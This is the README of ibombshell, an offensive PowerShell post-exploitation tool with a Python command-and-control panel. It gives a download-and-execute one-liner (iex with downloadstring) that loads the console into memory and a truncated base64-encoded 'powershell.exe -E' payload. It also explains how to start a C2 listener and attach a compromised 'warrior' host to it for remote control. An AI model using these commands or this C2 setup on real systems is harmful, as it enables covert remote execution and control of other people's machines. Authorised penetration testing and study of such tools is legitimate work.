```

**ibombshell** is a tool written in Powershell that allows you to have a prompt at any time with post-exploitation functionalities (and in some cases exploitation). It is a shell that is downloaded directly to memory providing access to a large number of pentesting features. These functionalities can be downloaded directly to memory, in the form of a Powershell function. This form of execution is known as _everywhere_.

In addition, _ibombshell_ provides a second execution mode called _Silently_, so the pentester can execute an instance of ibombshell (called _warrior_). The compromised computer will be connected to a C2 panel through HTTP. Therefore, it will be possible to control the warrior and be able to load functions in memory that help the pentester. This is happening whithin the post-exploitation phase.

# Prerequisities

To run _ibombshell everywhere_ it is mandatory to have PowerShell 3.0 or higher. For operating systems other than Windows you can read more about this in the [PowerShell GitHub](https://github.com/PowerShell/PowerShell) - _PowerShell for every system!_.

To run the _ibombshell silently mode_ you need python 3.6 and some python libraries. You can install this with:

```[python]
cd ibombshell\ c2/
pip install -r requirements.txt
```

**Note**: ibombshell C2 works in **python 3.X**. Make sure you run a pip relative to this version.

# Usage

ibombshell has two execution modes:

## ibombshell everywhere

To load ibombshell simply run on PowerShell:

```[powershell]
iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/Telefonica/ibombshell/master/console’)
```

Now you can run the downloaded ibombshell console running:

```[powershell]
console
```

### ibombshell everywhere in isolated environments

If you need to use ibombshell in isolated environments, you must prepare your computer first in a networked environment. Load all the functions you will need, and use savefunctions to save them in the Windows registry.

Now you can use this base 64 code to get ibombshell:

```[powershell]
powershell.exe -E "JABwAGEAdABoACAAPQAgACcAaABrAGMAdQA6AFwAcwBvAGYAdAB3AGEAcgBlAFwAYwBsAGEAcwBzAGUAcwBcAGkAYgBvAG0AYgBzAGgAZQBsAGwAXABjAG8AbgBzAG8AbABlACcAOwAgAHQAcgB5ACAAewAJAGkAZgAoAHQAZQ

```

## ibombshell silently mode

This version allows you to run the ibombshell console and remotely control it from the C2 panel created in python. To run this version, first you must launch the console process in powershell:

```[powershell]
iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/Telefonica/ibombshell/master/console’)
```

On ibombshell C2 path, prepare the C2:

```[python]
python3 ibombshell.py
```

And create the listener where the warriors will connected:

```[ibombshell]
iBombShell> load modules/listener.py
[+] Loading module...
[+] Module loaded!
iBombShell[modules/listener.py]> run
```

The default listener port is 8080. Finally you can launch the console in silently mode on the host to get remote control:

```[powershell]
console -Silently -uriConsole http://[ip or domain]:[port]
```

# ibombshell C2 scheme

The basic operation of the ibombshell control panel follows the following scheme:

```[ascii]
        ibombshell                 C2
            |                      |
            |    newibombshell     |

            +--------------------->|
            |                      |
```
